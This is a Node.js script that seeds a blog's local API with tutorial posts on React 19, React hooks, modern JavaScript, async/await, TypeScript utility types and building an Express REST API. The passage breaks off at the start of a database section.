/**
 * Content seeding script — adds comprehensive posts covering all major topics.
 * Run: node scripts/seed-content.mjs <admin-token>
 */

const TOKEN = process.argv[2];
const BASE = "http://localhost:8080";

if (!TOKEN) {
  console.error("Usage: node scripts/seed-content.mjs <admin-token>");
  process.exit(1);
}

async function createPost(post) {
  const res = await fetch(`${BASE}/api/posts`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "x-admin-token": TOKEN,
    },
    body: JSON.stringify(post),
  });
  if (!res.ok) {
    const body = await res.text();
    console.error(`❌ Failed ${post.slug}: ${res.status} ${body}`);
    return null;
  }
  console.log(`✅ Created: ${post.title}`);
  return res.json();
}

const posts = [

  // ─── REACT ─────────────────────────────────────────────────────────────────

  {
    slug: "react-19-new-features",
    title: "React 19: Every New Feature Explained with Examples",
    excerpt: "React 19 is the biggest release in years. Server Components are stable, Actions are here, and the compiler is shipping. Here's everything that changed and how to use it.",
    category: "blog",
    tags: ["react", "javascript", "web-development"],
    readingTimeMinutes: 14,
    featured: true,
    difficulty: "intermediate",
    publishedAt: "2026-01-15T09:00:00Z",
    content: `
<h2 id="whats-new">What's New in React 19</h2>
<p>React 19 landed as a stable release after a long period in RC. It ships three foundational changes that reshape how React apps are built: stable Server Components, a new Actions model for async mutations, and the long-awaited React Compiler that eliminates manual memoisation.</p>

<h2 id="server-components">Stable React Server Components</h2>
<p>Server Components (RSC) are now fully stable and recommended for production. They run <em>exclusively on the server</em>, which means they can read from databases, access the filesystem, and use secrets — without shipping any of that code to the browser.</p>
<pre><code class="language-tsx">// This component runs only on the server — zero client JS shipped
async function BlogPost({ slug }: { slug: string }) {
  const post = await db.query.posts.findFirst({
    where: eq(posts.slug, slug),
  });

  return (
    &lt;article&gt;
      &lt;h1&gt;{post.title}&lt;/h1&gt;
      &lt;p&gt;{post.excerpt}&lt;/p&gt;
    &lt;/article&gt;
  );
}</code></pre>

<h2 id="actions">Actions: Async Mutations Made Simple</h2>
<p>Actions replace the old pattern of manually managing loading and error state for form submissions. Any async function can be an Action:</p>
<pre><code class="language-tsx">async function submitComment(formData: FormData) {
  "use server"; // Server Action
  const comment = formData.get("comment") as string;
  await db.insert(comments).values({ body: comment });
  revalidatePath("/posts");
}

export default function CommentForm() {
  return (
    &lt;form action={submitComment}&gt;
      &lt;textarea name="comment" /&gt;
      &lt;button type="submit"&gt;Post&lt;/button&gt;
    &lt;/form&gt;
  );
}</code></pre>

<h2 id="use-hook">The new <code>use()</code> hook</h2>
<p>The <code>use()</code> hook lets you read a Promise or Context inside a component — including inside conditionals and loops, which was previously impossible:</p>
<pre><code class="language-tsx">import { use, Suspense } from "react";

function UserProfile({ promise }: { promise: Promise&lt;User&gt; }) {
  const user = use(promise); // Suspends until resolved
  return &lt;p&gt;{user.name}&lt;/p&gt;;
}

function App() {
  const userPromise = fetchUser(userId);
  return (
    &lt;Suspense fallback={&lt;Spinner /&gt;}&gt;
      &lt;UserProfile promise={userPromise} /&gt;
    &lt;/Suspense&gt;
  );
}</code></pre>

<h2 id="compiler">The React Compiler</h2>
<p>The React Compiler (previously "React Forget") automatically memoises your components, eliminating the need to write <code>useMemo</code>, <code>useCallback</code>, and <code>React.memo</code> manually. It analyses your code at build time and inserts the right optimisations:</p>
<pre><code class="language-bash"># Before: you write this
const value = useMemo(() =&gt; expensiveCalc(a, b), [a, b]);
const handler = useCallback(() =&gt; doThing(value), [value]);

# After (with compiler): just write the obvious code
const value = expensiveCalc(a, b);
const handler = () =&gt; doThing(value);
# The compiler handles memoisation for you</code></pre>

<h2 id="form-status">useFormStatus and useOptimistic</h2>
<p><code>useFormStatus</code> reads the pending state of a parent form without prop drilling:</p>
<pre><code class="language-tsx">import { useFormStatus } from "react-dom";

function SubmitButton() {
  const { pending } = useFormStatus();
  return (
    &lt;button disabled={pending}&gt;
      {pending ? "Saving..." : "Save"}
    &lt;/button&gt;
  );
}</code></pre>
<p><code>useOptimistic</code> lets you show instant UI updates before the server confirms:</p>
<pre><code class="language-tsx">const [optimisticLikes, addOptimisticLike] = useOptimistic(
  post.likes,
  (state, _) =&gt; state + 1
);

async function handleLike() {
  addOptimisticLike(null); // instant update
  await likePost(post.id); // actual server call
}</code></pre>

<h2 id="ref-as-prop">ref as a Regular Prop</h2>
<p>You no longer need <code>forwardRef</code>. In React 19, <code>ref</code> is just a prop:</p>
<pre><code class="language-tsx">// Before React 19
const Input = forwardRef&lt;HTMLInputElement, Props&gt;((props, ref) =&gt; (
  &lt;input ref={ref} {...props} /&gt;
));

// React 19
function Input({ ref, ...props }: Props &amp; { ref?: React.Ref&lt;HTMLInputElement&gt; }) {
  return &lt;input ref={ref} {...props} /&gt;;
}</code></pre>

<h2 id="upgrading">Upgrading to React 19</h2>
<p>The React team provides an official codemod for most breaking changes:</p>
<pre><code class="language-bash">npx codemod@latest react/19/migration-recipe</code></pre>
<p>Most common breaking changes to watch out for:</p>
<ul>
  <li><code>ReactDOM.render</code> removed — use <code>createRoot</code></li>
  <li><code>defaultProps</code> on function components removed — use default parameters</li>
  <li><code>string refs</code> removed — use callback refs or <code>useRef</code></li>
  <li><code>ReactDOM.hydrate</code> removed — use <code>hydrateRoot</code></li>
</ul>
    `,
  },

  {
    slug: "react-hooks-complete-guide",
    title: "React Hooks: The Complete Guide (useState to useTransition)",
    excerpt: "A practical deep dive into every React hook — useState, useEffect, useRef, useContext, useReducer, useMemo, useCallback, useTransition, useDeferredValue, and useId.",
    category: "tutorial",
    tags: ["react", "hooks", "javascript"],
    readingTimeMinutes: 18,
    featured: true,
    difficulty: "intermediate",
    series: "React Mastery",
    seriesOrder: 1,
    publishedAt: "2026-01-20T09:00:00Z",
    content: `
<h2 id="why-hooks">Why Hooks Changed React</h2>
<p>Before hooks, stateful logic was confined to class components, leading to messy lifecycle methods, deeply nested render props, and fragile HOC chains. Hooks let you extract and share stateful logic as plain functions. This guide covers every built-in hook with real-world examples.</p>

<h2 id="usestate">useState — Local Component State</h2>
<p>The most fundamental hook. It returns the current state and a setter function:</p>
<pre><code class="language-tsx">const [count, setCount] = useState(0);

// Functional update — always use when new state depends on old state
setCount(prev =&gt; prev + 1);

// Object state — spread to merge
const [user, setUser] = useState({ name: "", email: "" });
setUser(prev =&gt; ({ ...prev, name: "Alice" }));</code></pre>
<p><strong>Key rule:</strong> Never mutate state directly. React's reactivity depends on reference equality checks — if you mutate the existing object/array, React won't re-render.</p>

<h2 id="useeffect">useEffect — Side Effects and Lifecycle</h2>
<p>Run effects after render. The dependency array controls when the effect re-runs:</p>
<pre><code class="language-tsx">useEffect(() =&gt; {
  const controller = new AbortController();

  fetch("/api/posts", { signal: controller.signal })
    .then(r =&gt; r.json())
    .then(setPosts);

  // Cleanup — runs before next effect and on unmount
  return () =&gt; controller.abort();
}, [/* empty = run once after mount */]);</code></pre>
<p><strong>Common mistakes:</strong></p>
<ul>
  <li>Omitting a dependency from the array (stale closure bug)</li>
  <li>Not returning a cleanup function for subscriptions/timers</li>
  <li>Putting an object/array in the dep array without memoising it (causes infinite loop)</li>
</ul>

<h2 id="useref">useRef — DOM Access and Mutable Values</h2>
<p><code>useRef</code> has two uses: accessing DOM nodes, and storing mutable values that don't trigger re-renders:</p>
<pre><code class="language-tsx">// DOM access
const inputRef = useRef&lt;HTMLInputElement&gt;(null);
&lt;input ref={inputRef} /&gt;
inputRef.current?.focus();

// Mutable value (interval ID, previous value, etc.)
const timerRef = useRef&lt;ReturnType&lt;typeof setInterval&gt; | null&gt;(null);
timerRef.current = setInterval(tick, 1000);
// Does NOT cause a re-render when changed</code></pre>

<h2 id="usecontext">useContext — Share State Without Prop Drilling</h2>
<pre><code class="language-tsx">const ThemeContext = createContext&lt;"light" | "dark"&gt;("light");

function App() {
  const [theme, setTheme] = useState&lt;"light" | "dark"&gt;("light");
  return (
    &lt;ThemeContext.Provider value={theme}&gt;
      &lt;Page /&gt;
    &lt;/ThemeContext.Provider&gt;
  );
}

function Button() {
  const theme = useContext(ThemeContext); // No prop drilling
  return &lt;button className={theme}&gt;Click&lt;/button&gt;;
}</code></pre>

<h2 id="usereducer">useReducer — Complex State Logic</h2>
<p>When state transitions have multiple sub-values or complex logic, <code>useReducer</code> is cleaner than multiple <code>useState</code> calls:</p>
<pre><code class="language-tsx">type State = { count: number; step: number };
type Action = { type: "increment" } | { type: "setStep"; payload: number };

function reducer(state: State, action: Action): State {
  switch (action.type) {
    case "increment": return { ...state, count: state.count + state.step };
    case "setStep": return { ...state, step: action.payload };
  }
}

const [state, dispatch] = useReducer(reducer, { count: 0, step: 1 });
dispatch({ type: "increment" });
dispatch({ type: "setStep", payload: 5 });</code></pre>

<h2 id="usememo-usecallback">useMemo and useCallback</h2>
<p>Both skip expensive recalculations when dependencies haven't changed. With the React Compiler, you usually don't need these — but they're still valuable in React 18 projects:</p>
<pre><code class="language-tsx">// useMemo — memoises a computed value
const sortedPosts = useMemo(
  () =&gt; [...posts].sort((a, b) =&gt; b.date - a.date),
  [posts]
);

// useCallback — memoises a function reference
const handleDelete = useCallback(
  (id: number) =&gt; dispatch({ type: "delete", id }),
  [dispatch]
);</code></pre>

<h2 id="usetransition">useTransition — Non-Blocking Updates</h2>
<p>Mark a state update as non-urgent so React can interrupt it to handle more important updates (like user input):</p>
<pre><code class="language-tsx">const [isPending, startTransition] = useTransition();

function handleSearch(query: string) {
  setInputValue(query); // urgent — update input immediately
  startTransition(() =&gt; {
    setFilteredResults(filterPosts(query)); // non-urgent
  });
}</code></pre>

<h2 id="usedeferredvalue">useDeferredValue — Deferred Derived State</h2>
<p>Similar to <code>useTransition</code> but for values you don't control (e.g., props from a parent):</p>
<pre><code class="language-tsx">const deferredQuery = useDeferredValue(query);
// deferredQuery lags behind query during fast typing
// so the expensive filter doesn't block the UI</code></pre>

<h2 id="useid">useId — Stable IDs for SSR</h2>
<p>Generate IDs that are stable across server and client renders — critical for hydration:</p>
<pre><code class="language-tsx">function EmailField() {
  const id = useId();
  return (
    &lt;&gt;
      &lt;label htmlFor={id}&gt;Email&lt;/label&gt;
      &lt;input id={id} type="email" /&gt;
    &lt;/&gt;
  );
}</code></pre>

<h2 id="custom-hooks">Writing Custom Hooks</h2>
<p>Any function that calls hooks is a custom hook. Prefix with <code>use</code> to signal this to React's linter:</p>
<pre><code class="language-tsx">function useLocalStorage&lt;T&gt;(key: string, initialValue: T) {
  const [value, setValue] = useState&lt;T&gt;(() =&gt; {
    try {
      const item = localStorage.getItem(key);
      return item ? (JSON.parse(item) as T) : initialValue;
    } catch {
      return initialValue;
    }
  });

  const setAndPersist = useCallback(
    (newValue: T) =&gt; {
      setValue(newValue);
      localStorage.setItem(key, JSON.stringify(newValue));
    },
    [key]
  );

  return [value, setAndPersist] as const;
}</code></pre>
    `,
  },

  // ─── JAVASCRIPT ────────────────────────────────────────────────────────────

  {
    slug: "modern-javascript-es2024",
    title: "Modern JavaScript: Every ES2024 Feature You Should Actually Use",
    excerpt: "Array grouping, Object.groupBy, Promise.withResolvers, RegExp v flag, and more. A practical guide to the features that shipped in ES2024 with real code examples.",
    category: "blog",
    tags: ["javascript", "es2024", "web-development"],
    readingTimeMinutes: 11,
    featured: false,
    difficulty: "intermediate",
    publishedAt: "2026-02-01T09:00:00Z",
    content: `
<h2 id="overview">ES2024 at a Glance</h2>
<p>ES2024 (ES15) shipped a focused set of features that solve real everyday problems. This guide skips the spec and shows you how to use each one in production code today.</p>

<h2 id="object-groupby">Object.groupBy and Map.groupBy</h2>
<p>Finally, a native way to group arrays by a key — no more Lodash <code>_.groupBy</code>:</p>
<pre><code class="language-javascript">const posts = [
  { title: "Astro Guide", category: "tutorial" },
  { title: "React Hooks", category: "tutorial" },
  { title: "Web Vitals", category: "blog" },
];

const byCategory = Object.groupBy(posts, post =&gt; post.category);
// {
//   tutorial: [ { title: "Astro Guide", ... }, { title: "React Hooks", ... } ],
//   blog: [ { title: "Web Vitals", ... } ]
// }

// Map.groupBy preserves any key type (not just strings)
const byLength = Map.groupBy(posts, post =&gt; post.title.length);
</code></pre>

<h2 id="promise-with-resolvers">Promise.withResolvers()</h2>
<p>Creates a Promise along with its <code>resolve</code> and <code>reject</code> functions — useful when you need to control a Promise from outside its executor:</p>
<pre><code class="language-javascript">// Before: the clunky way
let resolve, reject;
const promise = new Promise((res, rej) =&gt; { resolve = res; reject = rej; });

// ES2024: clean one-liner
const { promise, resolve, reject } = Promise.withResolvers();

// Perfect for wrapping event-based APIs
function waitForClick(element) {
  const { promise, resolve } = Promise.withResolvers();
  element.addEventListener("click", resolve, { once: true });
  return promise;
}
const event = await waitForClick(button);</code></pre>

<h2 id="array-transfer">ArrayBuffer.prototype.transfer()</h2>
<p>Move an ArrayBuffer's memory to a new buffer and detach the original — zero-copy transfers between workers:</p>
<pre><code class="language-javascript">const buffer = new ArrayBuffer(1024);
const view = new Uint8Array(buffer);
view[0] = 42;

const newBuffer = buffer.transfer(); // buffer is now detached
console.log(buffer.byteLength); // 0 — memory has moved
console.log(new Uint8Array(newBuffer)[0]); // 42</code></pre>

<h2 id="regexp-v-flag">RegExp v Flag (Unicode Sets)</h2>
<p>The new <code>v</code> flag enables set operations, string properties, and improved Unicode support in regex:</p>
<pre><code class="language-javascript">// Match emoji with string properties
const emojiRegex = /\p{Emoji}/v;

// Set intersection: letters that are also ASCII
const asciiLetters = /[\p{Letter}&amp;&amp;\p{ASCII}]/v;

// Set difference: letters that are NOT ASCII (non-Latin scripts)
const nonAsciiLetters = /[\p{Letter}--\p{ASCII}]/v;</code></pre>

<h2 id="array-methods">Updated Array Methods</h2>
<p>ES2024 added non-mutating versions of common array operations — they return a new array instead of modifying in place:</p>
<pre><code class="language-javascript">const arr = [3, 1, 2];

// toSorted — non-mutating sort
const sorted = arr.toSorted(); // [1, 2, 3], arr unchanged

// toReversed — non-mutating reverse
const reversed = arr.toReversed(); // [2, 1, 3]

// toSpliced — non-mutating splice
const spliced = arr.toSpliced(1, 1, 99); // [3, 99, 2]

// with — non-mutating index update
const updated = arr.with(0, 100); // [100, 1, 2]</code></pre>

<h2 id="temporal">Temporal API (Stage 3)</h2>
<p>The successor to <code>Date</code> — finally a sane date/time API. Stage 3 in 2024, expected stable in ES2025:</p>
<pre><code class="language-javascript">// Available via polyfill today: @js-temporal/polyfill
import { Temporal } from "@js-temporal/polyfill";

const now = Temporal.Now.plainDateTimeISO();
const tomorrow = now.add({ days: 1 });

// Time zone aware
const nyc = Temporal.ZonedDateTime.from("2024-03-15T14:30[America/New_York]");
const london = nyc.withTimeZone("Europe/London");
console.log(london.toString()); // 2024-03-15T18:30:00+00:00[Europe/London]

// Duration arithmetic
const duration = Temporal.Duration.from({ hours: 2, minutes: 30 });
const meetingEnd = now.add(duration);</code></pre>

<h2 id="using-keyword">The using Keyword (Explicit Resource Management)</h2>
<p>TypeScript 5.2 and Stage 3 in JS. Auto-disposes resources when they go out of scope — like <code>using</code> in C# or <code>with</code> in Python:</p>
<pre><code class="language-typescript">class DatabaseConnection {
  constructor() { /* open connection */ }
  [Symbol.dispose]() { /* close connection */ }
}

{
  using conn = new DatabaseConnection();
  await conn.query("SELECT 1");
} // conn[Symbol.dispose]() is automatically called here

// Works with async too
await using stream = createAsyncStream();</code></pre>
    `,
  },

  {
    slug: "async-await-javascript-guide",
    title: "Async/Await in JavaScript: From Promises to Parallel Execution",
    excerpt: "Master asynchronous JavaScript — understand the event loop, write clean async/await code, handle errors properly, and run operations in parallel without blocking.",
    category: "tutorial",
    tags: ["javascript", "async", "promises", "web-development"],
    readingTimeMinutes: 13,
    featured: false,
    difficulty: "beginner",
    publishedAt: "2026-02-10T09:00:00Z",
    content: `
<h2 id="event-loop">How JavaScript Handles Async Code</h2>
<p>JavaScript is single-threaded — it can only do one thing at a time. Asynchronous operations (network requests, timers, file reads) are handled by the browser or Node.js environment, which puts their callbacks in a queue when they finish. The event loop picks up those callbacks when the main thread is free.</p>

<h2 id="promises">Promises: The Foundation</h2>
<p>A Promise is an object representing a value that may be available now, in the future, or never. It has three states: pending, fulfilled, or rejected:</p>
<pre><code class="language-javascript">const promise = new Promise((resolve, reject) =&gt; {
  setTimeout(() =&gt; {
    if (Math.random() &gt; 0.5) {
      resolve("Success!");
    } else {
      reject(new Error("Failed!"));
    }
  }, 1000);
});

promise
  .then(value =&gt; console.log(value))
  .catch(error =&gt; console.error(error))
  .finally(() =&gt; console.log("Always runs"));</code></pre>

<h2 id="async-await">async/await: Syntactic Sugar for Promises</h2>
<p><code>async/await</code> is not a new concept — it's syntax that makes Promise chains readable. Under the hood, every <code>async</code> function returns a Promise:</p>
<pre><code class="language-javascript">// Promise chain
function fetchUser(id) {
  return fetch(\`/api/users/\${id}\`)
    .then(res =&gt; res.json())
    .then(user =&gt; user.name);
}

// Equivalent with async/await
async function fetchUser(id) {
  const res = await fetch(\`/api/users/\${id}\`);
  const user = await res.json();
  return user.name;
}</code></pre>

<h2 id="error-handling">Error Handling</h2>
<p>Use <code>try/catch</code> for error handling in async functions. Never leave errors unhandled:</p>
<pre><code class="language-javascript">async function getPost(slug) {
  try {
    const res = await fetch(\`/api/posts/\${slug}\`);
    if (!res.ok) {
      throw new Error(\`HTTP error: \${res.status}\`);
    }
    return await res.json();
  } catch (error) {
    if (error instanceof TypeError) {
      // Network failure
      console.error("Network error:", error.message);
    } else {
      console.error("API error:", error.message);
    }
    throw error; // Re-throw so caller can handle it
  }
}</code></pre>

<h2 id="parallel">Running Operations in Parallel</h2>
<p>This is where async/await beginners lose performance. Awaiting inside a loop runs operations <em>sequentially</em>:</p>
<pre><code class="language-javascript">// ❌ Sequential — takes 3000ms if each call takes 1000ms
for (const id of [1, 2, 3]) {
  const user = await fetchUser(id); // waits for each before next
  console.log(user);
}

// ✅ Parallel — takes ~1000ms total
const users = await Promise.all([1, 2, 3].map(id =&gt; fetchUser(id)));
console.log(users);</code></pre>

<h2 id="promise-combinators">Promise Combinators</h2>
<pre><code class="language-javascript">// Promise.all — all must succeed, or it rejects immediately
const [user, posts, settings] = await Promise.all([
  fetchUser(id),
  fetchPosts(id),
  fetchSettings(id),
]);

// Promise.allSettled — waits for all, doesn't reject early
const results = await Promise.allSettled([fetch(url1), fetch(url2)]);
const successes = results
  .filter(r =&gt; r.status === "fulfilled")
  .map(r =&gt; r.value);

// Promise.race — first to settle wins
const result = await Promise.race([fetch(url), timeout(5000)]);

// Promise.any — first to succeed wins (ignores rejections)
const fastest = await Promise.any([mirror1, mirror2, mirror3]);</code></pre>

<h2 id="async-iteration">Async Iteration</h2>
<p>Use <code>for await...of</code> to consume async iterables — like streams or paginated APIs:</p>
<pre><code class="language-javascript">async function* paginate(url) {
  let page = 1;
  while (true) {
    const res = await fetch(\`\${url}?page=\${page}\`);
    const data = await res.json();
    if (data.items.length === 0) break;
    yield data.items;
    page++;
  }
}

for await (const items of paginate("/api/posts")) {
  console.log("Got page with", items.length, "items");
}</code></pre>

<h2 id="abort-controller">Cancelling Requests with AbortController</h2>
<pre><code class="language-javascript">async function searchPosts(query) {
  const controller = new AbortController();

  // Cancel after 5 seconds
  const timeout = setTimeout(() =&gt; controller.abort(), 5000);

  try {
    const res = await fetch(\`/api/posts?q=\${query}\`, {
      signal: controller.signal,
    });
    return await res.json();
  } catch (error) {
    if (error.name === "AbortError") {
      console.log("Request was cancelled");
      return null;
    }
    throw error;
  } finally {
    clearTimeout(timeout);
  }
}</code></pre>
    `,
  },

  // ─── TYPESCRIPT ─────────────────────────────────────────────────────────────

  {
    slug: "typescript-utility-types",
    title: "TypeScript Utility Types: Partial, Pick, Omit, and 12 More Explained",
    excerpt: "Stop rewriting types by hand. TypeScript's built-in utility types let you transform existing types into new ones. This guide covers all 15 utility types with practical examples.",
    category: "tutorial",
    tags: ["typescript", "type-safety", "web-development"],
    readingTimeMinutes: 16,
    featured: false,
    difficulty: "intermediate",
    series: "TypeScript Deep Dives",
    seriesOrder: 1,
    publishedAt: "2026-02-15T09:00:00Z",
    content: `
<h2 id="why-utility-types">Why Utility Types Matter</h2>
<p>Utility types are generic types built into TypeScript that transform other types. They allow you to derive new types from existing ones without copying and pasting, keeping your types DRY and maintainable.</p>

<h2 id="partial">Partial&lt;T&gt; — All Properties Optional</h2>
<pre><code class="language-typescript">interface User {
  id: number;
  name: string;
  email: string;
  role: "admin" | "user";
}

// All fields become optional — perfect for update payloads
type UserUpdate = Partial&lt;User&gt;;
// { id?: number; name?: string; email?: string; role?: "admin" | "user" }

function updateUser(id: number, data: Partial&lt;User&gt;) {
  return db.update(users).set(data).where(eq(users.id, id));
}</code></pre>

<h2 id="required">Required&lt;T&gt; — All Properties Required</h2>
<pre><code class="language-typescript">interface Config {
  timeout?: number;
  retries?: number;
  baseUrl?: string;
}

// After validation, all fields are present
type ResolvedConfig = Required&lt;Config&gt;;
// { timeout: number; retries: number; baseUrl: string }</code></pre>

<h2 id="readonly">Readonly&lt;T&gt; — Immutable Object</h2>
<pre><code class="language-typescript">interface State {
  count: number;
  items: string[];
}

const state: Readonly&lt;State&gt; = { count: 0, items: [] };
state.count = 1; // ❌ Cannot assign to 'count' because it is a read-only property</code></pre>

<h2 id="pick-omit">Pick&lt;T, K&gt; and Omit&lt;T, K&gt;</h2>
<pre><code class="language-typescript">interface Post {
  id: number;
  slug: string;
  title: string;
  content: string;
  createdAt: Date;
  authorId: number;
}

// Pick specific fields — great for API responses
type PostSummary = Pick&lt;Post, "id" | "slug" | "title" | "createdAt"&gt;;

// Omit fields you don't want to expose
type PostInput = Omit&lt;Post, "id" | "createdAt"&gt;;</code></pre>

<h2 id="record">Record&lt;K, V&gt; — Typed Object Maps</h2>
<pre><code class="language-typescript">// Category counts
const stats: Record&lt;"blog" | "tutorial" | "how-to", number&gt; = {
  blog: 5,
  tutorial: 12,
  "how-to": 8,
};

// Dynamic keys
type UserMap = Record&lt;string, User&gt;;
const users: UserMap = {};
users["alice"] = { id: 1, name: "Alice", email: "alice@example.com", role: "user" };</code></pre>

<h2 id="exclude-extract">Exclude&lt;T, U&gt; and Extract&lt;T, U&gt;</h2>
<pre><code class="language-typescript">type AllStatuses = "pending" | "active" | "banned" | "deleted";

// Remove types from a union
type ActiveStatuses = Exclude&lt;AllStatuses, "banned" | "deleted"&gt;;
// "pending" | "active"

// Keep only types that match
type DangerousStatuses = Extract&lt;AllStatuses, "banned" | "deleted"&gt;;
// "banned" | "deleted"</code></pre>

<h2 id="nonnullable">NonNullable&lt;T&gt; — Remove null and undefined</h2>
<pre><code class="language-typescript">type MaybeString = string | null | undefined;
type DefiniteString = NonNullable&lt;MaybeString&gt;; // string

// Useful after null checks
function processValue(val: string | null) {
  if (!val) return;
  const clean: NonNullable&lt;typeof val&gt; = val; // now just string
}</code></pre>

<h2 id="returntype-parameters">ReturnType and Parameters</h2>
<pre><code class="language-typescript">function createPost(title: string, content: string, tags: string[]) {
  return { id: Math.random(), title, content, tags, createdAt: new Date() };
}

// Infer the return type
type Post = ReturnType&lt;typeof createPost&gt;;
// { id: number; title: string; content: string; tags: string[]; createdAt: Date }

// Infer parameter types
type CreatePostParams = Parameters&lt;typeof createPost&gt;;
// [title: string, content: string, tags: string[]]</code></pre>

<h2 id="awaited">Awaited&lt;T&gt; — Unwrap Promise Types</h2>
<pre><code class="language-typescript">async function fetchUser(id: number) {
  const res = await fetch(\`/api/users/\${id}\`);
  return res.json() as Promise&lt;User&gt;;
}

type FetchedUser = Awaited&lt;ReturnType&lt;typeof fetchUser&gt;&gt;; // User</code></pre>

<h2 id="template-literal">Template Literal Types</h2>
<p>Not a utility type, but incredibly powerful when combined with them:</p>
<pre><code class="language-typescript">type EventName = "click" | "focus" | "blur";
type EventHandler = \`on\${Capitalize&lt;EventName&gt;}\`;
// "onClick" | "onFocus" | "onBlur"

type CSSProperty = "margin" | "padding";
type CSSDirection = "top" | "right" | "bottom" | "left";
type CSSLonghand = \`\${CSSProperty}-\${CSSDirection}\`;
// "margin-top" | "margin-right" | ... | "padding-left"</code></pre>

<h2 id="infer">Infer — Extract Types from Conditional Types</h2>
<pre><code class="language-typescript">// Extract the element type from an array
type ElementType&lt;T&gt; = T extends (infer E)[] ? E : never;
type StrElem = ElementType&lt;string[]&gt;; // string

// Extract return type from any function (like ReturnType)
type MyReturnType&lt;T extends (...args: any) =&gt; any&gt; =
  T extends (...args: any) =&gt; infer R ? R : never;</code></pre>
    `,
  },

  // ─── NODE.JS / BACKEND ──────────────────────────────────────────────────────

  {
    slug: "nodejs-rest-api-express",
    title: "Building a Production REST API with Node.js and Express",
    excerpt: "A complete guide to building a type-safe, well-structured REST API with Node.js, Express, Zod validation, JWT auth, and proper error handling. From zero to deployable.",
    category: "tutorial",
    tags: ["nodejs", "express", "api", "backend", "typescript"],
    readingTimeMinutes: 20,
    featured: true,
    difficulty: "intermediate",
    publishedAt: "2026-02-20T09:00:00Z",
    content: `
<h2 id="setup">Project Setup</h2>
<p>We'll build a REST API with Express 5, TypeScript, Zod for runtime validation, and pino for logging. Start by creating the project:</p>
<pre><code class="language-bash">mkdir my-api && cd my-api
npm init -y
npm install express zod pino pino-http dotenv
npm install -D typescript @types/express @types/node tsx nodemon</code></pre>
<p>Configure TypeScript:</p>
<pre><code class="language-json">// tsconfig.json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "NodeNext",
    "moduleResolution": "NodeNext",
    "outDir": "./dist",
    "strict": true,
    "esModuleInterop": true
  }
}</code></pre>

<h2 id="structure">Project Structure</h2>
<pre><code class="language-text">src/
├── routes/
│   ├── posts.ts
│   └── users.ts
├── middleware/
│   ├── auth.ts
│   └── errors.ts
├── lib/
│   ├── db.ts
│   └── logger.ts
└── index.ts</code></pre>

<h2 id="entry-point">Entry Point</h2>
<pre><code class="language-typescript">// src/index.ts
import express from "express";
import { pino } from "pino";
import { pinoHttp } from "pino-http";

const logger = pino({ level: "info" });
const app = express();

app.use(express.json());
app.use(pinoHttp({ logger }));

// Routes
app.use("/api/posts", postsRouter);
app.use("/api/users", usersRouter);

// Global error handler (must have 4 params)
app.use((err: Error, req: express.Request, res: express.Response, _next: express.NextFunction) =&gt; {
  req.log.error(err);
  res.status(500).json({ error: "Internal server error" });
});

const PORT = Number(process.env.PORT) || 3000;
app.listen(PORT, () =&gt; logger.info(\`Server listening on port \${PORT}\`));</code></pre>

<h2 id="zod-validation">Input Validation with Zod</h2>
<p>Always validate incoming data. Zod gives you runtime type safety:</p>
<pre><code class="language-typescript">import { z } from "zod";

const CreatePostSchema = z.object({
  title: z.string().min(1).max(200),
  content: z.string().min(10),
  tags: z.array(z.string()).max(10).optional(),
  published: z.boolean().default(false),
});

type CreatePost = z.infer&lt;typeof CreatePostSchema&gt;;

// Reusable validation middleware
function validate&lt;T&gt;(schema: z.ZodSchema&lt;T&gt;) {
  return (req: express.Request, res: express.Response, next: express.NextFunction) =&gt; {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      res.status(400).json({ error: result.error.flatten() });
      return;
    }
    req.body = result.data;
    next();
  };
}</code></pre>

<h2 id="routes">Route Handlers</h2>
<pre><code class="language-typescript">// src/routes/posts.ts
import { Router } from "express";

const router = Router();

router.get("/", async (req, res) =&gt; {
  const { page = "1", limit = "20" } = req.query;
  const posts = await db.query.posts.findMany({
    limit: Number(limit),
    offset: (Number(page) - 1) * Number(limit),
    orderBy: desc(posts.createdAt),
  });
  res.json({ posts, page: Number(page) });
});

router.post("/", validate(CreatePostSchema), async (req, res) =&gt; {
  const post = await db.insert(posts).values(req.body).returning();
  res.status(201).json(post[0]);
});

router.get("/:id", async (req, res) =&gt; {
  const post = await db.query.posts.findFirst({
    where: eq(posts.id, Number(req.params.id)),
  });
  if (!post) {
    res.status(404).json({ error: "Post not found" });
    return;
  }
  res.json(post);
});

export default router;</code></pre>

<h2 id="auth">JWT Authentication Middleware</h2>
<pre><code class="language-typescript">// src/middleware/auth.ts
import jwt from "jsonwebtoken";

const SECRET = process.env.JWT_SECRET!;

interface JWTPayload {
  userId: number;
  role: "user" | "admin";
}

// Extend Express Request to carry authenticated user
declare global {
  namespace Express {
    interface Request { user?: JWTPayload; }
  }
}

export function requireAuth(req: express.Request, res: express.Response, next: express.NextFunction) {
  const token = req.headers.authorization?.slice(7);
  if (!token) { res.status(401).json({ error: "Missing token" }); return; }

  try {
    req.user = jwt.verify(token, SECRET) as JWTPayload;
    next();
  } catch {
    res.status(401).json({ error: "Invalid token" });
  }
}

export function requireAdmin(req: express.Request, res: express.Response, next: express.NextFunction) {
  requireAuth(req, res, () =&gt; {
    if (req.user?.role !== "admin") {
      res.status(403).json({ error: "Admin only" });
      return;
    }
    next();
  });
}</code></pre>

<h2 id="error-handling">Centralised Error Handling</h2>
<pre><code class="language-typescript">// src/middleware/errors.ts
export class AppError extends Error {
  constructor(
    public statusCode: number,
    message: string,
  ) {
    super(message);
    this.name = "AppError";
  }
}

// In routes, throw AppError for expected errors
router.get("/:id", async (req, res, next) =&gt; {
  try {
    const post = await findPost(req.params.id);
    if (!post) throw new AppError(404, "Post not found");
    res.json(post);
  } catch (error) {
    next(error); // pass to global error handler
  }
});

// Global error handler
app.use((err: Error, req: express.Request, res: express.Response, _: express.NextFunction) =&gt; {
  if (err instanceof AppError) {
    res.status(err.statusCode).json({ error: err.message });
    return;
  }
  req.log.error(err);
  res.status(500).json({ error: "Internal server error" });
});</code></pre>

<h2 id="rate-limiting">Rate Limiting</h2>
<pre><code class="language-bash">npm install express-rate-limit</code></pre>
<pre><code class="language-typescript">import rateLimit from "express-rate-limit";

const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: "Too many requests, try again later" },
});

app.use("/api", apiLimiter);</code></pre>
    `,
  },

  // ─── DATABASE ───────────────────────────────────────────────────────────────

  {
